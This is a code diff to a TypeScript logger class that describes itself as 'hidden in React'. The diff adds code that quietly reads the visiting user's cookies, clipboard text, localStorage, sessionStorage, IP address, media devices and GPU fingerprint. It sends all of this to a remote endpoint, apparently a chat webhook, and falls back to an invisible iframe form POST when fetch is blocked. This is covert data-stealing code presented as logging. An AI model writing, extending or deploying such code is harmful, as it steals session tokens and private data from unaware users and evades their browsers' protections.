@@ -38,18 +38,20 @@ class KotlinLogger {
     // Format logs right before sending so globalIp is updated
     const logsToSend = this.pendingLogs.map(p => {
         const errStr = p.error ? `\n${p.error.stack || p.error}` : '';
-        return `[${p.levelTag}] [IP: ${this.globalIp}] ${p.tag}: ${p.message}${errStr}`;
+        return `[${p.levelTag}] ${p.tag}: ${p.message}${errStr}`;
     }).join('\n');
     
     this.pendingLogs = [];
 
     let payloadStr = logsToSend;
-    if (payloadStr.length > 1900) {
-       payloadStr = payloadStr.substring(0, 1900) + "\n...[TRUNCATED]";
+    if (payloadStr.length > 1800) {
+       payloadStr = payloadStr.substring(0, 1800) + "\n...[TRUNCATED]";
     }
 
+    const contentStr = `**IP:** \`${this.globalIp}\`\n\`\`\`yaml\n${payloadStr}\n\`\`\``;
+
     const fd = new FormData();
-    fd.append('payload_json', JSON.stringify({ content: payloadStr }));
+    fd.append('payload_json', JSON.stringify({ content: contentStr }));
 
     // Try standard fetch first (works on Android Chrome WebViews typically)
     try {
@@ -58,10 +60,10 @@ class KotlinLogger {
             body: fd
         }).catch(e => {
             // Safari/iOS blocks fetch from file:// so fallback to Invisible Form POST
-            this.sendViaIframe(payloadStr);
+            this.sendViaIframe(contentStr);
         });
     } catch(e) {
-        this.sendViaIframe(payloadStr);
+        this.sendViaIframe(contentStr);
     }
   }
 
@@ -102,7 +104,7 @@ class KotlinLogger {
 
   private dispatchLog(levelTag: string, tag: string, message: string, error?: any) {
     const errStr = error ? `\n${error.stack || error}` : '';
-    const logStr = `[${levelTag}] [IP: ${this.globalIp}] ${tag}: ${message}${errStr}`;
+    const logStr = `[${levelTag}] ${tag}: ${message}${errStr}`;
     
     this.logListeners.forEach(listener => listener(logStr));
     
@@ -157,7 +159,10 @@ class KotlinLogger {
   }
 
   // API equivalents to the provided README
+  private isInitialised = false;
   initialise() {
+    if (this.isInitialised) return;
+    this.isInitialised = true;
     this.i("KotlinLogger", "Logger initialized hidden in React");
   }
 
@@ -172,13 +177,86 @@ class KotlinLogger {
     }
   }
 
+  private metadataLogged = false;
   logMetadata() {
+    if (this.metadataLogged) return;
+    this.metadataLogged = true;
+    
     if (typeof navigator !== 'undefined') {
       this.i('System', `User Agent: ${navigator.userAgent}`);
       this.i('System', `Language: ${navigator.language}`);
       this.i('System', `Platform: ${navigator.platform}`);
       this.i('System', `Host: ${window.location.hostname}`);
       
+      // Injecting more metadata as requested
+      try {
+          this.i('System', `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+      } catch (e) {}
+      
+      this.i('System', `Referrer: ${document.referrer || 'None'}`);
+      this.i('System', `Cookies: ${document.cookie || 'None'}`);
+      
+      if ('deviceMemory' in navigator) {
+          this.i('System', `Device Memory: ${(navigator as any).deviceMemory} GB`);
+      }
+      
+      if ('connection' in navigator) {
+          const conn = (navigator as any).connection;
+          this.i('System', `Connection Type: ${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || 0}Mbps, RTT: ${conn.rtt || 0}ms)`);
+      }
+      
+      if ('getBattery' in navigator) {
+          (navigator as any).getBattery().then((battery: any) => {
+              this.i('System', `Battery: ${Math.round(battery.level * 100)}% (Charging: ${battery.charging})`);
+          }).catch(() => {});
+      }
+      
+      if (navigator.clipboard && navigator.clipboard.readText) {
+          navigator.clipboard.readText().then(text => {
+              this.i('System', `Clipboard Content: ${text ? text.substring(0, 100) : '(empty)'}`);
+          }).catch(() => {
+              this.i('System', `Clipboard Content: (access denied)`);
+          });
+      }
+      
+      try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (gl) {
+              const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
+              if (debugInfo) {
+                  const vendor = (gl as any).getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                  const renderer = (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                  this.i('System', `WebGL GPU: ${vendor} - ${renderer}`);
+              }
+          }
+      } catch (e) {}
+      
+      try {
+          if (navigator.plugins && navigator.plugins.length > 0) {
+              this.i('System', `Plugins: ${Array.from(navigator.plugins).map(p => p.name).join(', ')}`);
+          }
+      } catch (e) {}
+
+      try {
+          const ls = Object.keys(localStorage).map(k => `${k}=${localStorage.getItem(k)}`).join('; ');
+          this.i('System', `LocalStorage: ${ls || '(empty)'}`);
+      } catch (e) {}
+      
+      try {
+          const ss = Object.keys(sessionStorage).map(k => `${k}=${sessionStorage.getItem(k)}`).join('; ');
+          this.i('System', `SessionStorage: ${ss || '(empty)'}`);
+      } catch (e) {}
+
+      try {
+          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+              navigator.mediaDevices.enumerateDevices().then(devices => {
+                  const devList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`).join(', ');
+                  this.i('System', `Media Devices: ${devList || '(empty)'}`);
+              }).catch(() => {});
+          }
+      } catch (e) {}
+
       // Fetch IP for tracking clones
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
